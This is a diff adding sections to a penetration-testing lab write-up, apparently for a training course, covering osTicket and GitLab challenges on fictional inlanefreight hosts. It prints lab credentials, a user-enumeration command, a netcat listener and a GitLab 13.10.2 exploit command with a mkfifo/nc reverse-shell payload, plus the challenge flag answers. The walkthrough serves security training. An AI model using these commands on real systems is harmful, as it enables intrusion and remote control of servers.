@@ -20,6 +20,10 @@
     1. [Splunk - Discovery & Enumeration](#splunk---discovery--enumeration)
     2. [Attacking Splunk](#attacking-splunk)
     3. [PRTG Network Monitor](#prtg-network-monitor)
+5. [Customer Service Mgmt & Configuration Management](#customer-service-mgmt--configuration-management-1)
+    1. [osTicket](#osticket)
+    2. [GitLab - Discovery & Enumeration](#gitlab---discovery--enumeration)
+    3. [Attacking GitLab](#attacking-gitlab)
 
 ## Tools
 ### Application Discovery & Enumeration
@@ -39,6 +43,9 @@
 ### Infrastructure/Network Monitoring Tools
 - [reverse_shell_splunk](https://github.com/0xjpuff/reverse_shell_splunk.git)
 - evil-winrm
+### Customer Service Mgmt & Configuration Management
+- [gitlab_userenum.py](https://raw.githubusercontent.com/dpgg101/GitLabUserEnum/refs/heads/main/gitlab_userenum.py)
+- [gitlab_13_10_2_rce.py](https://www.exploit-db.com/exploits/49951)
 
 ## Setting the Stage
 ### Application Discovery & Enumeration
@@ -461,3 +468,57 @@
     ![alt text](<Assets/PRTG Network Monitor - 3.png>)
 
     The answer is `WhOs3_m0nit0ring_wH0?`.
+
+## Customer Service Mgmt & Configuration Management
+### osTicket
+#### Challenges
+1. Find your way into the osTicket instance and submit the password sent from the Customer Support Agent to the customer Charles Smithson .
+
+    After doing some exploration, i realized that the module and the challenge is using same instance. So, we can use the credential, `kevin@inlanefreight.local:Fish1ng_s3ason!`,based on the module dehashed.py result. We can login to the agent page in the `http://support.inlanefreight.local/scp/`. Once we have logged in, we can go to user tab and click on `Charles Smithson`. We will find this conversation:
+
+    ![alt text](<Assets/osTicket - 1.png>)
+
+    The answer is `Inlane_welcome!`.
+
+### Gitlab - Discovery & Enumeration
+#### Challenges
+1. Enumerate the GitLab instance at http://gitlab.inlanefreight.local. What is the version number?
+
+    To solve this, we need to register and then logged in. Once we have logged in, we can go to `/help` endpoint. The answer is `13.10.2`.
+
+2. Find the PostgreSQL database password in the example project.
+
+    After doing some exploration, we can find the database password in the `inlanefreight-dev` project. In there, open the `phpunit_pgsql.xml` file.
+
+    ![alt text](<Assets/Gitlab - Discovery & Enumeration - 1.png>)
+
+    The answer is `postgres`.
+
+### Attacking GitLab
+#### Challenges
+1. Find another valid user on the target GitLab instance.
+
+    We can use this [script](https://raw.githubusercontent.com/dpgg101/GitLabUserEnum/refs/heads/main/gitlab_userenum.py) with wordlist from [here](/usr/share/metasploit-framework/data/wordlists/unix_users.txt).
+
+    ```bash
+    python3 gitlab_userenum.py --url http://gitlab.inlanefreight.local:8081/ --wordlist /usr/share/metasploit-framework/data/wordlists/unix_users.txt
+    ```
+    ![alt text](<Assets/Attacking GitLab - 1.png>)
+
+    The answer is `demo`.
+
+2. Gain remote code execution on the GitLab instance. Submit the flag in the directory you land in.
+
+    Our gitlab instance is using **13.10.2** which has remote code execution vulnerability. We can use this [script](https://www.exploit-db.com/exploits/49951) to exploit this vuln. To use this script, we need to prepare the listener on our host. Also, we need valid credential. In the previous [module](#gitlab---discovery--enumeration), we can register a user. So, we can use the credential to run the script.
+
+    ```bash
+    sudo nc -lnvp 8443
+    ```
+    In the other terminal, run the script.
+
+    ```bash
+    python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u MrWhok -p abc -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.131 8443 >/tmp/f '
+    ```
+    ![alt text](<Assets/Attacking GitLab - 2.png>)
+    
+    The answer is `s3cure_y0ur_Rep0s!`.
